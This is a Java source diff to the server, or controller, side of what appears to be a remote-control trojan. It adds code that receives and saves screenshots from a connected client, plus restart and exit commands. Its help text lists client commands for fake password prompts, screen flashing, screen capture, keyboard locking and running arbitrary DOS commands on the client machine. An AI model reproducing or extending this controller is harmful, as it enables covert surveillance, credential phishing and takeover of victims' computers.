@@ -73,13 +73,14 @@ public class ServerSocket {
 			}
 			
 	}
+	
 	class MyInputThread implements Runnable {
 		public void run() {
 			while (true) {
 				try {
 					fromClientStr = dis.readUTF();
 					if (fromClientStr.equals("getPic()")) {
-						//getPic();
+						getPic();
 						System.out.println("Download pic is finish.");
 					} else if (fromClientStr.equals("2start")) {
 					} 
@@ -93,7 +94,49 @@ public class ServerSocket {
 			}
 		}
 	}
-
+	public void getPic() {
+		int length = 0;
+		File file = new File(path + "\\" + fileName + "\\" + (picNum++)
+				+ ".jpg");
+		byte[] imageData = new byte[8192];
+		FileOutputStream fos = null;
+		int num = 0;
+		try {
+			fos = new FileOutputStream(file);
+		} catch (FileNotFoundException e3) {
+			e3.printStackTrace();
+		}
+		try {
+			length = dis.readInt();
+		} catch (IOException e2) {
+			e2.printStackTrace();
+		}
+		while (true) {
+			try {
+				num = dis.read(imageData, 0, imageData.length);
+				fos.write(imageData, 0, num);
+				length -= num;
+				if (length == 0) {
+					break;
+				}
+			} catch (Exception e) {
+				try {
+					System.out.println("error");
+					fos.flush();
+					fos.close();
+				} catch (IOException e1) {
+					e1.printStackTrace();
+				}
+				break;
+			}
+		}
+		try {
+			if (file != null)
+				fos.close();
+		} catch (IOException e1) {
+			e1.printStackTrace();
+		}
+	}
 	public void showMsg(String msg) {
 		if (msg == null) {
 			return;
@@ -120,8 +163,27 @@ public class ServerSocket {
 			System.out.println("input command:");
 			dosS = in.nextLine().trim();
 			if (dosS==null||dosS.equals("")) {
+			}else if (dosS.equals("-r")) {
+				try {
+					if(socket.isConnected()){
+						socket.close();
+						new ServerSocket();
+						break;
+					}
+				} catch (Exception e) {
+					// TODO: handle exception
+				}
 			} else if (dosS.equals("exit")) {
+				try {
+					if(socket.isConnected()){
+						socket.close();
+						break;
+					}
+				} catch (Exception e) {
+					// TODO: handle exception
+				}
 			} else if (dosS.endsWith("-help")) {
+				System.out.println("-r 重新啟動伺服器\n exit 離開伺服器\n -p 擷取客戶端畫面");
 				System.out.println("-doutmsg msg 以对话框形式输出信息\n" + "-dinmsg msg弹出一个输入对话框+显示信息msg\n"
 						+ "-dinpass msg 弹出一个输入密码对话框+显示信息msg\n" + "-flash msg 闪屏并显示msg所表示的文字\n" + "-p:获取图片\n"
 						+ "-m l锁定键盘 .....-m a取消锁定\n" + "输入其则执行相应的dos命令，如输入ipconfig 则显示相应的ip信息\n" + "exit:退出");
